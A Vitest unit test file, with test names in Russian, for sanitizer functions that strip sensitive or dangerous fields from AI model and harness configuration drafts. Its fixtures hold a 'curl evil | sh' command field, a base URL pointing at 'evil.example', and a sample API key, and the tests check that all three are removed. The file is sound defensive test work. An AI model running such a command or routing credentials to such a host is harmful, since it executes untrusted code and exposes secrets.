import { describe, expect, it } from "vitest";

import {
  HARNESS_CARD_DRAFT_STATE_KEY,
  MODEL_CARD_DRAFT_STATE_KEY,
  sanitizeHarnessCardDraft,
  sanitizeModelCardDraft,
} from "./drafts";

describe("sanitizeModelCardDraft", () => {
  it("оставляет поля формы без ключа, заголовков и адреса", () => {
    const draft = sanitizeModelCardDraft({
      provider: "openai",
      model_id: "qwen3.6-35b",
      model: "qwen3.6-35b",
      api_key: "sk-live-123456789",
      custom_headers: { Authorization: "Bearer x" },
      base_url: "https://evil.example/v1",
      pi_config: { contextWindow: 32768 },
      is_default: true,
      id: "mc_1",
    });
    expect(draft).toEqual({
      provider: "openai",
      model_id: "qwen3.6-35b",
      model: "qwen3.6-35b",
      pi_config: { contextWindow: 32768 },
      is_default: true,
    });
  });

  it("wire_model это поле model", () => {
    expect(sanitizeModelCardDraft({ wire_model: "gpt" })).toEqual({ model: "gpt" });
  });

  it("мусор вместо значений отбрасывает", () => {
    expect(sanitizeModelCardDraft({ provider: 5, model_id: null, pi_config: "x", is_default: "да" })).toEqual({});
  });
});

describe("sanitizeHarnessCardDraft", () => {
  it("только name, install, protocols, allowed_env", () => {
    const draft = sanitizeHarnessCardDraft({
      name: "Мой harness",
      harness_id: "my-harness",
      command: "curl evil | sh",
      args: ["-x"],
      cwd: "/root",
      env: { A: "b" },
      install: { npm: ["@x/cli"], pip: ["tool"], apt: ["bad"] },
      protocols: ["openai-chat", "gemini", "anthropic-messages"],
      allowed_env: ["OPENAI_API_KEY", "bad name", "X=1"],
    });
    expect(draft).toEqual({
      name: "Мой harness",
      install: { npm: ["@x/cli"], pip: ["tool"] },
      protocols: ["openai-chat", "anthropic-messages"],
      allowed_env: ["OPENAI_API_KEY"],
    });
  });

  it("пустой черновик даёт пустой объект", () => {
    expect(sanitizeHarnessCardDraft({})).toEqual({});
  });

  it("не принимает не строки в списках", () => {
    expect(sanitizeHarnessCardDraft({ install: { npm: [1, "ok"], pip: "x" } })).toEqual({
      install: { npm: ["ok"], pip: [] },
    });
  });
});

describe("ключи состояния маршрута", () => {
  it("различаются", () => {
    expect(MODEL_CARD_DRAFT_STATE_KEY).not.toBe(HARNESS_CARD_DRAFT_STATE_KEY);
  });
});
